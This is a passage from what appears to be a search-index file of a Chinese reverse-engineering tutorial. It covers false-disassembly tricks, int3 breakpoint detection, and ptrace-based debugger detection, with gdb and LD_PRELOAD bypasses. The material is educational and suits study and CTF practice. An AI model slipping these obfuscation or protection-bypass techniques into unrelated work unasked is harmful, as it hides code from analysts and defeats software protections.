\u90fd\u88ab\u5f88\u597d\u7684\u9690\u85cf\u8d77\u6765. \u4e0d\u4ec5\u5982\u6b64, \u6211\u4eec\u8ba1\u7b97\nEIP\n\u7684\u8fc7\u7a0b\u4e5f\u88ab\u5b8c\u7f8e\u7684\u9690\u85cf\u4e86\u8d77\u6765. \u5b9e\u9645\u4e0a\u6574\u4e2a\u53cd\u6c47\u7f16\u7684\u4ee3\u7801\u5df2\u7ecf\u8ddf\u5b9e\u9645\u4ee3\u7801\u5b8c\u5168\u4e0d\u540c.\n\n\n\u5982\u4f55\u89e3\u51b3\u8fd9\u9879\u95ee\u9898? \u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u80fd\u591f\u4fdd\u8bc1\n100%\n\u51c6\u786e\u53cd\u6c47\u7f16\u7684\u5de5\u5177, \u5f53\u53cd\u6c47\u7f16\u5668\u505a\u5230\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u65f6\u5019\u4e5f\u8bb8\u80fd\u505a\u5230\u5b8c\u5168\u6b63\u786e\u7684\u6c47\u7f16.\n\n\n\u5728\u73b0\u5b9e\u60c5\u51b5, \u8fd9\u5e76\u4e0d\u662f\u7279\u522b\u5927\u7684\u95ee\u9898. \u56e0\u4e3a\u9488\u5bf9\u4ea4\u4e92\u6027\u53cd\u6c47\u7f16\u5668. \u4f60\u662f\u53ef\u4ee5\u6307\u5b9a\u4ee3\u7801\u8d77\u59cb\u7684\u4f4d\u7f6e. \u800c\u4e14\u5f53\u8c03\u8bd5\u7684\u65f6\u5019, \u4e5f\u80fd\u5f88\u597d\u7684\u770b\u660e\u767d\u7a0b\u5e8f\u5b9e\u9645\u8df3\u8f6c\u7684\u5730\u5740.\n\n\n\u6240\u4ee5\u6b64\u65f6\u6211\u4eec\u9664\u5f00\u9700\u8981\u9759\u6001\u5206\u6790, \u4e5f\u9700\u8981\u52a8\u6001\u8c03\u8bd5.\n\n\n\n\nReference: \nBeginners Guide to Basic Linux Anti Anti Debugging Techniques", 
            "title": "False Disassembly"
        }, 
        {
            "location": "/reverse/linux/false-disasm/#_1", 
            "text": "\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u5229\u7528 jmp \u8df3\u8f6c\u5230\u67d0\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4\u6267\u884c, \u4e5f\u5c31\u662f\u8bf4\u771f\u5b9e\u7684\u4ee3\u7801\u662f\u4ece\u67d0\u6761\u6307\u4ee4\"\u4e4b\u4e2d\"\u5f00\u59cb\u7684, \u4f46\u5728\u53cd\u6c47\u7f16\u65f6\u7531\u4e8e\u662f\u9488\u5bf9\u6574\u6761\u6307\u4ee4\u800c\u4e0d\u80fd\u5217\u51fa\u771f\u6b63\u88ab\u8fd0\u884c\u7684\u6c47\u7f16\u6307\u4ee4\u4ee3\u7801.   \u8bf4\u8d77\u6765\u597d\u50cf\u5f88\u62d7\u53e3, \u5f88\u96be\u61c2, \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b\u5427, \u7ed9\u51fa\u4ee5\u4e0b\u7684\u6c47\u7f16\u4ee3\u7801.  start:\n    jmp label+1\nlabel:  \n    DB 0x90\n    mov eax, 0xf001  \u8fd9\u6bb5\u4ee3\u7801 label \u6240\u5728\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u662f DB 0x90 . \u6211\u4eec\u6765\u770b\u770b objdump \u5bf9\u8fd9\u6bb5\u4ee3\u7801\u53cd\u6c47\u7f16\u7684\u7ed3\u679c:  08048080  start :\n  8048080:  e9 01 00 00 00  jmp 8048086  label+0x1 \n08048085  label :\n  8048085:  90      nop\n  8048086:  b8 01 f0 00 00  mov eax,0xf001  \u770b\u8d77\u6765\u4e5f\u6ca1\u4ec0\u4e48\u95ee\u9898,  DB 0x90 \u88ab\u51c6\u786e\u5730\u53cd\u6c47\u7f16\u6210 90 nop .   \u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06 nop \u6307\u4ee4\u4fee\u6539\u4e3a1\u5b57\u8282\u4ee5\u4e0a\u7684\u6307\u4ee4, \u90a3\u4e48objdump\u5c31\u4e0d\u4f1a\u8ddf\u968f\u6211\u4eec\u7684jump\u5e76\u6b63\u786e\u7684\u53cd\u6c47\u7f16, \u800c\u662f\u7ebf\u6027\u5730\u4ece\u4e0a\u5f80\u4e0b\u7ee7\u7eed\u6c47\u7f16(\u7ebf\u6027\u626b\u63cf\u7b97\u6cd5). \u6bd4\u5982\u6211\u5c06 DB 0x90 \u6539\u6210\u4e86 DB 0xE9 , \u6765\u770b\u770bobjdump\u518d\u6b21\u53cd\u6c47\u7f16\u7684\u7ed3\u679c:  08048080  start :\n  8048080:  e9 01 00 00 00  jmp 8048086  label+0x1 \n08048085  label :\n  8048085:  e9 b8 01 f0 00  jmp 8f48242  __bss_start+0xeff1b6   \u5bf9\u6bd4\u4e4b\u524d\u7684\u53cd\u6c47\u7f16\u7ed3\u679c, \u4f60\u5f88\u660e\u663e\u5730\u770b\u51fa\u6765\u662f\u4ec0\u4e48\u60c5\u51b5\u4e86\u5427.  DB 0xE9 \u5355\u7eaf\u53ea\u662f\u4e00\u4e2a\u6570\u636e, \u4e5f\u4e0d\u4f1a\u88ab\u6267\u884c, \u800c\u53cd\u6c47\u7f16\u51fa\u7684\u7ed3\u679c, \u5374\u5c06\u5176\u89c6\u4f5c\u4e00\u4e2a\u6307\u4ee4, \u4e4b\u540e\u7684\u7ed3\u679c\u4e5f\u56e0\u6b64\u800c\u6539\u53d8\u4e86.  objdump \u5ffd\u7565\u4e86jmp\u7684\u76ee\u7684\u5730\u5740\u5904\u7684\u4ee3\u7801 \u5e76\u76f4\u63a5\u6c47\u7f16jmp\u540e\u7684\u6307\u4ee4, \u8fd9\u6837\u6211\u4eec\u771f\u6b63\u7684\u4ee3\u7801\u4e5f\u5c31\u88ab\u5f88\u597d\u5730\"\u9690\u85cf\"\u4e86\u8d77\u6765", 
            "title": "\u8df3\u5230\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4"
        }, 
        {
            "location": "/reverse/linux/false-disasm/#_2", 
            "text": "\u8be5\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462? \u770b\u8d77\u6765\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u5c06\u8fd9\u4e2a\u65e0\u7528\u7684 0xE9 \u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u624b\u52a8\u66ff\u6362\u6210 0x90 . \u4f46\u662f\u5982\u679c\u7a0b\u5e8f\u6709\u8fdb\u884c\u6587\u4ef6\u6821\u9a8c, \u8ba1\u7b97checksum\u503c, \u90a3\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u884c\u4e0d\u901a\u4e86.   \u6240\u4ee5\u66f4\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u4f7f\u7528\u5982IDA\u6216\u7c7b\u4f3c\u6709\u505a\u63a7\u5236\u6d41\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668, \u5bf9\u4e8e\u540c\u6837\u6709\u95ee\u9898\u7684\u7a0b\u5e8f. \u53cd\u6c47\u7f16\u7ed3\u679c\u53ef\u80fd\u5982\u4e0b:     ---- section .text ----:\n08048080    E9 01 00 00 00  jmp Label_08048086\n                                                ; (08048086)\n                                                ; (near + 0x1)\n08048085    DB E9\n\nLabel_08048086:\n08048086    B8 01 F0 00 00  mov eax, 0xF001\n                                                ; xref ( 08048080 )   \u53cd\u6c47\u7f16\u7ed3\u679c\u770b\u4e0a\u53bb\u8fd8\u884c", 
            "title": "\u89e3\u51b3\u65b9\u6cd5"
        }, 
        {
            "location": "/reverse/linux/false-disasm/#_3", 
            "text": "\u8fd9\u79cd\u65b9\u6cd5, \u751a\u81f3\u53ef\u4ee5\u5bf9\u6297\u5206\u6790\u63a7\u5236\u6d41\u7684\u53cd\u6c47\u7f16\u5668. \u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u4e2a\u793a\u4f8b\u4ee3\u7801, \u66f4\u597d\u5730\u7406\u89e3:  ; ----------------------------------------------------------------------------\n    call earth+1\nReturn:\n                    ; x instructions or random bytes here               x byte(s)\nearth:              ; earth = Return + x\n    xor eax, eax    ; align disassembly, using single byte opcode       1 byte\n    pop eax         ; start of function: get return address ( Return )  1 byte\n                    ; y instructions or random bytes here               y byte(s)\n    add eax, x+2+y+2+1+1+z ; x+y+z+6                                    2 bytes\n    push eax        ;                                                   1 byte\n    ret             ;                                                   1 byte\n                    ; z instructions or random bytes here               z byte(s)\n; Code:\n                    ; !! Code Continues Here !!\n; ----------------------------------------------------------------------------  \u7a0b\u5e8f\u901a\u8fc7 call+pop \u6765\u83b7\u53d6\u8c03\u7528\u51fd\u6570\u5f53\u65f6\u4fdd\u5b58\u5230\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740, \u5176\u5b9e\u5c31\u662f\u8c03\u7528\u51fd\u6570\u524d\u7684 EIP . \u7136\u540e\u5728\u51fd\u6570\u8fd4\u56de\u5904\u585e\u5165\u5783\u573e\u6570\u636e. \u4f46\u5b9e\u9645\u4e0a\u5728\u51fd\u6570\u8fd0\u884c\u65f6\u5df2\u7ecf\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u5230\u4e86Code\u5904. \u56e0\u6b64 earth \u51fd\u6570\u8fd4\u56de\u4f1a\u8df3\u8f6c\u5230 Code \u5904\u7ee7\u7eed\u8fd0\u884c\uff0c\u800c\u4e0d\u662f Return \u5904\u7ee7\u7eed\u8fd0\u884c.  \u6765\u770b\u4e00\u4e2a\u7b80\u6613\u7684demo  ; ----------------------------------------------------------------------------\n    call earth+1\nearth:  \n    DB 0xE9             ; 1  --- pushed return address,\n                        ; E9 is opcode for jmp to disalign disas-\n    ; sembly\n    pop eax             ; 1 hidden\n    nop                 ; 1\n    add eax, 9          ; 2 hidden\n    push eax            ; 1 hidden\n    ret                 ; 1 hidden\n    DB 0xE9             ; 1 opcode for jmp to misalign disassembly\nCode:                   ; code continues here  --- pushed return address + 9\n    nop\n    nop\n    nop\n    ret\n; ----------------------------------------------------------------------------  \u5982\u679c\u662f\u4f7f\u7528objdump\u8fdb\u884c\u53cd\u6c47\u7f16, \u5149\u662f call earth+1 \u5c31\u4f1a\u51fa\u73b0\u95ee\u9898, \u5982\u4e0b:  00000000  earth-0x5 :\n  0:    e8 01 00 00 00  call 6  earth+0x1 \n00000005  earth :\n  5:    e9 58 90 05 09  jmp 9059062  earth+0x905905d \n  a:    00 00           add %al,(%eax)\n  c:    00 50 c3        add %dl,0xffffffc3(%eax)\n  f:    e9 90 90 90 c3  jmp c39090a4  earth+0xc390909f   \u6765\u770b\u4e00\u4e0b ida \u7684\u60c5\u51b5  text:08000000   ; Segment permissions: Read/Execute\n.text:08000000   _text  segment para public  CODE  use32\n.text:08000000      assume cs:_text\n.text:08000000      ;org 8000000h\n.text:08000000      assume  es:nothing, ss:nothing, ds:_text,\n.text:08000000          fs:nothing, gs:nothing\n.text:08000000      dd 1E8h\n.text:08000004 ; -------------------------------------------------------------\n.text:08000004      add cl, ch\n.text:08000006      pop eax\n.text:08000007      nop\n.text:08000008      add eax, 9\n.text:0800000D      push eax\n.text:0800000E      retn\n.text:0800000E ; -------------------------------------------------------------\n.text:0800000F      dd 909090E9h\n.text:08000013 ; -------------------------------------------------------------\n.text:08000013      retn\n.text:08000013 _text        ends\n.text:08000013\n.text:08000013\n.text:08000013      end  \u6211\u4eec\u5728\u6700\u540e\u76843\u4e2a nop , \u90fd\u88ab\u5f88\u597d\u7684\u9690\u85cf\u8d77\u6765. \u4e0d\u4ec5\u5982\u6b64, \u6211\u4eec\u8ba1\u7b97 EIP \u7684\u8fc7\u7a0b\u4e5f\u88ab\u5b8c\u7f8e\u7684\u9690\u85cf\u4e86\u8d77\u6765. \u5b9e\u9645\u4e0a\u6574\u4e2a\u53cd\u6c47\u7f16\u7684\u4ee3\u7801\u5df2\u7ecf\u8ddf\u5b9e\u9645\u4ee3\u7801\u5b8c\u5168\u4e0d\u540c.  \u5982\u4f55\u89e3\u51b3\u8fd9\u9879\u95ee\u9898? \u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u80fd\u591f\u4fdd\u8bc1 100% \u51c6\u786e\u53cd\u6c47\u7f16\u7684\u5de5\u5177, \u5f53\u53cd\u6c47\u7f16\u5668\u505a\u5230\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u65f6\u5019\u4e5f\u8bb8\u80fd\u505a\u5230\u5b8c\u5168\u6b63\u786e\u7684\u6c47\u7f16.  \u5728\u73b0\u5b9e\u60c5\u51b5, \u8fd9\u5e76\u4e0d\u662f\u7279\u522b\u5927\u7684\u95ee\u9898. \u56e0\u4e3a\u9488\u5bf9\u4ea4\u4e92\u6027\u53cd\u6c47\u7f16\u5668. \u4f60\u662f\u53ef\u4ee5\u6307\u5b9a\u4ee3\u7801\u8d77\u59cb\u7684\u4f4d\u7f6e. \u800c\u4e14\u5f53\u8c03\u8bd5\u7684\u65f6\u5019, \u4e5f\u80fd\u5f88\u597d\u7684\u770b\u660e\u767d\u7a0b\u5e8f\u5b9e\u9645\u8df3\u8f6c\u7684\u5730\u5740.  \u6240\u4ee5\u6b64\u65f6\u6211\u4eec\u9664\u5f00\u9700\u8981\u9759\u6001\u5206\u6790, \u4e5f\u9700\u8981\u52a8\u6001\u8c03\u8bd5.   Reference:  Beginners Guide to Basic Linux Anti Anti Debugging Techniques", 
            "title": "\u8fd0\u884c\u65f6\u8ba1\u7b97\u8df3\u8f6c\u5730\u5740"
        }, 
        {
            "location": "/reverse/linux/detect-bp/", 
            "text": "gdb\u901a\u8fc7\u66ff\u6362\u76ee\u6807\u5730\u5740\u7684\u5b57\u8282\u4e3a\n0xcc\n\u6765\u5b9e\u73b0\u65ad\u70b9, \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u68c0\u6d4b\nint 3\n\u65ad\u70b9\u7684\u793a\u4f8b:\n\n\nvoid\n \nfoo\n()\n \n{\n\n    \nprintf\n(\nHello\n\\n\n);\n\n\n}\n\n\nint\n \nmain\n()\n \n{\n\n    \nif\n \n((\n*\n(\nvolatile\n \nunsigned\n \n*\n)((\nunsigned\n)\nfoo\n)\n \n \n0xff\n)\n \n==\n \n0xcc\n)\n \n{\n\n        \nprintf\n(\nBREAKPOINT\n\\n\n);\n\n        \nexit\n(\n1\n);\n\n    \n}\n\n    \nfoo\n();\n\n\n}\n\n\n\n\n\n\u6b63\u5e38\u8fd0\u884c\u7a0b\u5e8f\u4f1a\u8f93\u51faHello, \u4f46\u662f\u5982\u679c\u4e4b\u524d\u6709\u5728\nfoo\n\u51fd\u6570\u8fd9\u91cc\u8bbe\u7f6e\ncc\n\u65ad\u70b9\u5e76\u8fd0\u884c, gdb\u5219\u65e0\u6cd5\u65ad\u4e0b, \u5e76\u4f1a\u8f93\u51fa\nBREAKPOINT\n. \n\n\n# gdb ./x\ngdb\n bp foo\nBreakpoint 1 at 0x804838c\ngdb\n run\nBREAKPOINT\nProgram exited with code 01.\n\n\n\n\n\u8fd9\u4e2a\u8981\u7ed5\u8fc7\u4e5f\u5f88\u7b80\u5355, \u90a3\u5c31\u662f\u9700\u8981\u9605\u8bfb\u6c47\u7f16\u4ee3\u7801\u5e76\u6ce8\u610f\u8bbe\u7f6e\u65ad\u70b9\u4e0d\u8981\u5728\nfoo\n\u51fd\u6570\u5165\u53e3\u5904. \u5b9e\u9645\u60c5\u51b5\u5c31\u8981\u770b\u68c0\u6d4b\u65ad\u70b9\u7684\u4f4d\u7f6e\u662f\u54ea\u91cc.\n\n\n\u8fd9\u79cd\u76d1\u89c6\u65ad\u70b9\u7684\u53cd\u8c03\u8bd5\u6280\u672f, \u5173\u952e\u4e0d\u5728\u4e8e\u5982\u4f55\u7ed5\u8fc7\u5b83, \u800c\u662f\u5728\u4e8e\u5982\u4f55\u68c0\u6d4b\u5b83. \u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u53d1\u73b0, \u7a0b\u5e8f\u4e5f\u6709\u6253\u5370\u51fa\u76f8\u5e94\u7684\u4fe1\u606f. \u5728\u5b9e\u9645\u60c5\u51b5\u4e2d, \u7a0b\u5e8f\u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f, \u65ad\u70b9\u4e5f\u65e0\u6cd5\u8f7b\u6613\u5730\u65ad\u4e0b. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\nperl\n\u811a\u672c\u8fc7\u6ee4\u53cd\u6c47\u7f16\u4ee3\u7801\u4e2d\u6709\u5173\n0xcc\n\u7684\u4ee3\u7801\u51fa\u6765\u8fdb\u884c\u68c0\u67e5.\n\n\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528perl\u811a\u672c\u8fc7\u6ee4\u53cd\u6c47\u7f16\u4ee3\u7801\u4e2d\u6709\u51730xcc\u7684\u4ee3\u7801\u51fa\u6765\u8fdb\u884c\u68c0\u67e5\n\n\n#!/usr/bin/perl\n\n\nwhile\n(\n)\n\n\n{\n\n    \nif\n(\n$_\n \n=~\n \nm/([0-9a-f][4]:\\s*[0-9a-f \\t]*.*0xcc)/\n \n){\n \nprint\n;\n \n}\n\n\n}\n\n\n\n\n\n\u663e\u793a\u7ed3\u679c\n\n\n# objdump -M intel -d xxx | ./antibp.pl\n      80483be: 3d cc 00 00 00 cmp eax,0xcc\n\n\n\n\n\u68c0\u6d4b\u5230\u540e, \u65e2\u53ef\u4ee5\u5c060xcc\u4fee\u6539\u62100x00\u62160x90, \u4e5f\u53ef\u4ee5\u505a\u4efb\u4f55\u4f60\u60f3\u505a\u7684\u64cd\u4f5c.\n\n\n\u6539\u53d80xcc\u4e5f\u540c\u6837\u53ef\u80fd\u5e26\u6765\u95ee\u9898, \u5c31\u5982\u4e0a\u7bc7\u4ecb\u7ecd\u4e00\u6837, \u7a0b\u5e8f\u5982\u679c\u6709\u8fdb\u884c\u6587\u4ef6\u6821\u9a8c, \u90a3\u4e48\u6211\u4eec\u7684\u6539\u53d8\u662f\u4f1a\u88ab\u68c0\u6d4b\u5230\u7684. \u53ef\u80fd\u7684\u60c5\u51b5\u4e0b, \u7a0b\u5e8f\u4e5f\u4e0d\u53ea\u662f\u5bf9\u51fd\u6570\u5165\u53e3\u70b9\u8fdb\u884c\u68c0\u6d4b, \u4e5f\u4f1a\u5728\u4e00\u4e2a\u5faa\u73af\u91cc\u5bf9\u6574\u4e2a\u51fd\u6570\u8fdb\u884c\u68c0\u6d4b.\n\n\n\u56e0\u6b64\u4f60\u4e5f\u53ef\u4ee5\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u624b\u52a8\u653e\u7f6e\u4e00\u4e2a\nICEBP(0xF1)\n\u5b57\u8282\u5230\u9700\u8981\u65ad\u4e0b\u7684\u4f4d\u7f6e(\u800c\u975e\nint 3\n). \u56e0\u4e3a\nICEBP\n\u4e5f\u4e00\u6837\u80fd\u8ba9gdb\u65ad\u4e0b\u6765.\n\n\n\n\nReference: \nBeginners Guide to Basic Linux Anti Anti Debugging Techniques", 
            "title": "Detecting Breakpoints"
        }, 
        {
            "location": "/reverse/linux/detect-dbg/", 
            "text": "\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5\u5f88\u591a, \u6bd4\u5982\u68c0\u6d4b\u8fdb\u7a0b\u540d\u4e4b\u7c7b. \u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u4e00\u79cd\u65b9\u6cd5, \u5c31\u662f\u901a\u8fc7\u68c0\u6d4b\u4e00\u4e9b\u51fd\u6570\u7684\u8c03\u7528\u60c5\u51b5\u6765\u5206\u6790\u7a0b\u5e8f\u5f53\u524d\u662f\u5426\u5904\u4e8e\u88ab\u8c03\u8bd5\u72b6\u6001\n\n\nint\n \nmain\n()\n\n\n{\n\n    \nif\n \n(\nptrace\n(\nPTRACE_TRACEME\n,\n \n0\n,\n \n1\n,\n \n0\n)\n \n \n0\n)\n \n{\n\n        \nprintf\n(\nDEBUGGING... Bye\n\\n\n);\n\n        \nreturn\n \n1\n;\n\n    \n}\n\n    \nprintf\n(\nHello\n\\n\n);\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u80fd\u88ab\u4e00\u4e2a\u8fdb\u7a0bptrace, \u5982\u679c\u4f60\u81ea\u5df1\u8c03\u7528ptrace, \u90a3\u4e48\u5176\u5b83\u7a0b\u5e8f\u5c31\u65e0\u6cd5\u901a\u8fc7ptrace\u8c03\u8bd5\u6216\u5411\u4f60\u7684\u7a0b\u5e8f\u6ce8\u5165\u4ee3\u7801. \n\n\n\u5982\u679c\u7a0b\u5e8f\u5f53\u524d\u88abgdb\u8c03\u8bd5, \u90a3\u4e48ptrace\u51fd\u6570\u5c31\u4f1a\u8fd4\u56de\u9519\u8bef, \u4e5f\u5c31\u4fa7\u9762\u8868\u660e\u4e86\u68c0\u6d4b\u5230\u4e86\u8c03\u8bd5\u5668\u7684\u5b58\u5728.\n\n\n\u7ed5\u8fc7\u65b9\u6cd51\n\n\n\u663e\u7136ptrace\u53ea\u80fd\u4f5c\u7528\u4e8e\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668, \u6211\u4eec\u53ef\u4ee5\u7528\u4e0d\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668.\n\n\n\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6253\u8865\u4e01\u7684\u65b9\u5f0f\u5c06ptrace\u51fd\u6570\u64e6\u9664, \u66f4\u7b80\u5355\u5c31\u662f\u5c06ptrace\u7684\u8c03\u7528\u4ee3\u7801\u6216\u662f\u4e4b\u540e\u7684\u6821\u9a8c\u7ed9\u64e6\u9664\u4e86.\n\n\n\u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6(\u5b9e\u9645\u60c5\u51b5\u4e0b\u4e0d\u592a\u53ef\u80fd)\u5728\u7f16\u8bd1\u65f6\u5e76\u6ca1\u6709\u542f\u7528-s\u9009\u9879(-s \u9009\u9879\u80fd\u79fb\u9664\u6240\u6709\u7684\u7b26\u53f7\u8868\u4fe1\u606f\u548c\u91cd\u5b9a\u4f4d\u4fe1\u606f), \u90a3\u4e48\u60c5\u51b5\u4f1a\u53d8\u5f97\u7b80\u5355\u5f88\u591a. \u6211\u4eec\u4ece\u8fd9\u4e2a\u7b80\u5355\u7684\u60c5\u51b5\u6765\u5206\u6790\n\n\n# objdump -t test_debug | grep ptrace\n080482c0    F *UND*     00000075    ptrace@@GLIBC_2.0\n\n\n\n\nptrace\u5728\n0x080482c0\n\u4f4d\u7f6e\u88ab\u8c03\u7528\n\n\n# objdump -d -M intel test_debug |grep 80482c0\n80482c0:    ff 25 04 96 04 08   jmp ds:0x8049604\n80483d4:    e8 e7 fe ff ff  call 80482c0 \n_init+0x28\n\n\n\n\n\n\u90a3\u8981\u662f\u6709\u542f\u7528-s\u9009\u9879, \u8be5\u600e\u4e48\u5904\u7406\u5462? \u8fd9\u65f6\u6211\u4eec\u9700\u8981\u4f7f\u7528gdb\n\n\n# gdb test_debug\ngdb\n bp ptrace\nBreakpoint 1 at 0x80482c0\ngdb\n run\nBreakpoint 1 at 0x400e02f0\n......\n0x400e02f0 \nptrace\n: push %ebp\n0x400e02f1 \nptrace+1\n: mov %esp,%ebp\n0x400e02f3 \nptrace+3\n: sub $0x10,%esp\n0x400e02f6 \nptrace+6\n: mov %edi,0xfffffffc(%ebp)\n0x400e02f9 \nptrace+9\n: mov 0x8(%ebp),%edi\n0x400e02fc \nptrace+12\n: mov 0xc(%ebp),%ecx\n------------------------------------------------------------------------------\nBreakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6\n\n\n\n\n\u6211\u4eec\u7b80\u5355\u5730\u65ad\u5728\u4e86ptrace\u5904, \u73b0\u5728\u8f93\u5165finish\u6267\u884c\u5230\u5f53\u524d\u51fd\u6570\u8fd4\u56de, \u56de\u5230main\u51fd\u6570\u91cc\n\n\n# gdb test_debug\ngdb\n finish\n00x80483d9 \nmain+29\n:   add $0x10,%esp\n0x80483dc   \nmain+32\n:  test %eax,%eax\n0x80483de   \nmain+34\n:  jns 0x80483fa \nmain+62\n\n0x80483e0   \nmain+36\n:  sub $0xc,%esp\n0x80483e3   \nmain+39\n:  push $0x80484e8\n0x80483e8   \nmain+44\n:  call 0x80482e0\n------------------------------------------------------------------------------\n0x080483d9 in main ()\n\n\n\n\n\u5c06\u51fd\u6570\u8fd4\u56de\u7ed3\u679ceax\u4fee\u6539\u4e3a\u6b63\u786e\u7684\u8fd4\u56de\u7ed3\u679c, \u5c31\u53ef\u4ee5\u4e86\n\n\ngdb\n set $eax=0\ngdb\n c\neverything ok\nProgram exited with code 016.\n_______________________________________________________________________________\nNo registers.\ngdb\n\n\n\n\n\n\u7ed5\u8fc7\u65b9\u6cd52\n\n\n\u65b9\u6cd52\u5c31\u662f\u7f16\u5199\u81ea\u5df1\u7684ptrace\u51fd\u6570\n\n\n\u5982\u524d\u51e0\u7bc7\u6240\u8ff0, \nLD_PRELOAD\n\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u6307\u5411\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570.\n\n\n\u6211\u4eec\u5199\u4e00\u4e2aptrace\u51fd\u6570\u5e76\u751f\u6210\u76ee\u6807\u6587\u4ef6\n\n\n// -- ptrace.c --\n\n\n// gcc -shared ptrace.c -o ptrace.so\n\n\nint\n \nptrace\n(\nint\n \ni\n,\n \nint\n \nj\n,\n \nint\n \nk\n,\n \nint\n \nl\n)\n\n\n{\n\n    \nprintf\n(\n PTRACE CALLED!\n\\n\n);\n\n\n}\n\n\n\n\n\n\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfLD_PRELOAD\u6765\u4f7f\u7528\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570, \u5f53\u7136\u8fd9\u91cc\u662f\u53ef\u4ee5\u5728gdb\u4e2d\u8fdb\u884c\u8bbe\u7f6e\n\n\ngdb\n set environment LD_PRELOAD ./ptrace.so\ngdb\n run\nPTRACE CALLED!\nHello World!\nProgram exited with code 015.\ngdb\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u4e86. \n\n\n\n\nReference: \nBeginners Guide to Basic Linux Anti Anti Debugging Techniques", 
            "title": "Detecting debugging"
        }, 
        {
            "location": "/reverse/linux/detect-dbg/#1", 
            "text": "\u663e\u7136ptrace\u53ea\u80fd\u4f5c\u7528\u4e8e\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668, \u6211\u4eec\u53ef\u4ee5\u7528\u4e0d\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668.  \u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6253\u8865\u4e01\u7684\u65b9\u5f0f\u5c06ptrace\u51fd\u6570\u64e6\u9664, \u66f4\u7b80\u5355\u5c31\u662f\u5c06ptrace\u7684\u8c03\u7528\u4ee3\u7801\u6216\u662f\u4e4b\u540e\u7684\u6821\u9a8c\u7ed9\u64e6\u9664\u4e86.  \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6(\u5b9e\u9645\u60c5\u51b5\u4e0b\u4e0d\u592a\u53ef\u80fd)\u5728\u7f16\u8bd1\u65f6\u5e76\u6ca1\u6709\u542f\u7528-s\u9009\u9879(-s \u9009\u9879\u80fd\u79fb\u9664\u6240\u6709\u7684\u7b26\u53f7\u8868\u4fe1\u606f\u548c\u91cd\u5b9a\u4f4d\u4fe1\u606f), \u90a3\u4e48\u60c5\u51b5\u4f1a\u53d8\u5f97\u7b80\u5355\u5f88\u591a. \u6211\u4eec\u4ece\u8fd9\u4e2a\u7b80\u5355\u7684\u60c5\u51b5\u6765\u5206\u6790  # objdump -t test_debug | grep ptrace\n080482c0    F *UND*     00000075    ptrace@@GLIBC_2.0  ptrace\u5728 0x080482c0 \u4f4d\u7f6e\u88ab\u8c03\u7528  # objdump -d -M intel test_debug |grep 80482c0\n80482c0:    ff 25 04 96 04 08   jmp ds:0x8049604\n80483d4:    e8 e7 fe ff ff  call 80482c0  _init+0x28   \u90a3\u8981\u662f\u6709\u542f\u7528-s\u9009\u9879, \u8be5\u600e\u4e48\u5904\u7406\u5462? \u8fd9\u65f6\u6211\u4eec\u9700\u8981\u4f7f\u7528gdb  # gdb test_debug\ngdb  bp ptrace\nBreakpoint 1 at 0x80482c0\ngdb  run\nBreakpoint 1 at 0x400e02f0\n......\n0x400e02f0  ptrace : push %ebp\n0x400e02f1  ptrace+1 : mov %esp,%ebp\n0x400e02f3  ptrace+3 : sub $0x10,%esp\n0x400e02f6  ptrace+6 : mov %edi,0xfffffffc(%ebp)\n0x400e02f9  ptrace+9 : mov 0x8(%ebp),%edi\n0x400e02fc  ptrace+12 : mov 0xc(%ebp),%ecx\n------------------------------------------------------------------------------\nBreakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6  \u6211\u4eec\u7b80\u5355\u5730\u65ad\u5728\u4e86ptrace\u5904, \u73b0\u5728\u8f93\u5165finish\u6267\u884c\u5230\u5f53\u524d\u51fd\u6570\u8fd4\u56de, \u56de\u5230main\u51fd\u6570\u91cc  # gdb test_debug\ngdb  